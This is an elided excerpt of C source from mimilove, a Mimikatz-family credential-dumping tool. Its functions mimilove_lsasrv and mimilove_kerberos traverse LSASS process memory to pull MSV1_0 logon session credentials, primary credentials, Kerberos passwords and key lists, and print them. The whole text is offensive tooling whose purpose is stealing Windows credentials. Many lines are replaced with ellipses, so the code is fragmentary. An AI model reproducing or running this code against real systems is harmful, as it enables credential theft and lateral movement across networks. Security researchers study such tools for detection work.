...
void mimilove_lsasrv(PKULL_M_MEMORY_HANDLE hMemory)
{
	...
	MANGO_MSV1_0_LOGON_SESSION_TABLE_50 table;
	MANGO_MSV1_0_LIST_50 list;
	MANGO_MSV1_0_ENTRY_50 entry;
		...
		if(kuhl_m_sekurlsa_utils_love_search(&miLsasrv, &paLsasrv, (PVOID *) &LogonSessionTable))
		{
			...
			if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID)))
			{
				if(aLsassMemory.address = base) // buffer
				{
					...
					if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(MANGO_MSV1_0_LOGON_SESSION_TABLE_50)))
					{
						if(table.tag == 'XTHL')
						{
							tableCount = 16;
							baseTable = (PBYTE) aLsassMemory.address + sizeof(MANGO_MSV1_0_LOGON_SESSION_TABLE_50);
						}
					...
					{
						aLsassMemory.address = (PBYTE) baseTable + i * sizeof(MANGO_MSV1_0_LOGON_SESSION_TABLE_50);
						aLocalMemory.address = &table;
						if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(MANGO_MSV1_0_LOGON_SESSION_TABLE_50)))
						{
							base = (PBYTE) aLsassMemory.address + FIELD_OFFSET(MANGO_MSV1_0_LOGON_SESSION_TABLE_50, list);
							if(aLsassMemory.address = table.list.Flink)
							{
								while(aLsassMemory.address != base)
								{
									aLocalMemory.address = &list;
									if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(MANGO_MSV1_0_LIST_50)))
									{
										if(aLsassMemory.address = list.entry)
										{
											aLocalMemory.address = &entry;
											if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(MANGO_MSV1_0_ENTRY_50)))
											{
												if(aLsassMemory.address = entry.Credentials)
												{
													...
													while(aLsassMemory.address)
													{
														...
														if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(MANGO_MSV1_0_CREDENTIALS)))
														{
															if(aLsassMemory.address = credentials.PrimaryCredentials)
															{
																while(aLsassMemory.address)
																{
																	...
																	if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(MANGO_MSV1_0_PRIMARY_CREDENTIALS)))
																	{
																	...
																	{
																		PRINT_ERROR_AUTO(L"kull_m_memory_copy / MANGO_MSV1_0_PRIMARY_CREDENTIALS");
																		break;
																	}
																}
															}
														...
														{
															PRINT_ERROR_AUTO(L"kull_m_memory_copy / MANGO_MSV1_0_CREDENTIALS");
															break;
														}
													}
													kprintf(L"\n");
											...
											else PRINT_ERROR_AUTO(L"kull_m_memory_copy / MANGO_MSV1_0_ENTRY_50");
										}
									...
									{
										PRINT_ERROR_AUTO(L"kull_m_memory_copy / MANGO_MSV1_0_LIST_50");
										break;
									}
								}
							}
						...
						else PRINT_ERROR_AUTO(L"kull_m_memory_copy / MANGO_MSV1_0_LOGON_SESSION_TABLE_50");
					}
				}
...
void mimilove_kerberos(PKULL_M_MEMORY_HANDLE hMemory)
{
	...
	PVOID base;
	BYTE hash;
	MANGO_KERBEROS_LOGON_SESSION_50 session;
	MANGO_KERBEROS_KEYS_LIST_5 keyList;
			...
			if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID)))
			{
				if(aLsassMemory.address = base) // buffer
				{
					while(aLsassMemory.address != KerbLogonSessionList)
					{
						...
						if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(MANGO_KERBEROS_LOGON_SESSION_50)))
						{
							if(session.Password.Length || session.pKeyList)
							{
								...
								*((PBYTE) &session.Password.Length + 1) = 0;
								...
								if(aLsassMemory.address = session.pKeyList)
								{
									...
									if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(MANGO_KERBEROS_KEYS_LIST_5)))
									{
										if(pKeys = (PKERB_HASHPASSWORD_5) LocalAlloc(LPTR, keyList.cbItem * sizeof(KERB_HASHPASSWORD_5)))
										{
											aLsassMemory.address = (PBYTE) session.pKeyList + sizeof(MANGO_KERBEROS_KEYS_LIST_5);
									...
									else PRINT_ERROR_AUTO(L"kull_m_memory_copy / MANGO_KERBEROS_KEYS_LIST_5");
								}
								kprintf(L"\n");
						...
						{
							PRINT_ERROR_AUTO(L"kull_m_memory_copy / MANGO_KERBEROS_LOGON_SESSION_50");
							break;
						}
					}
				}
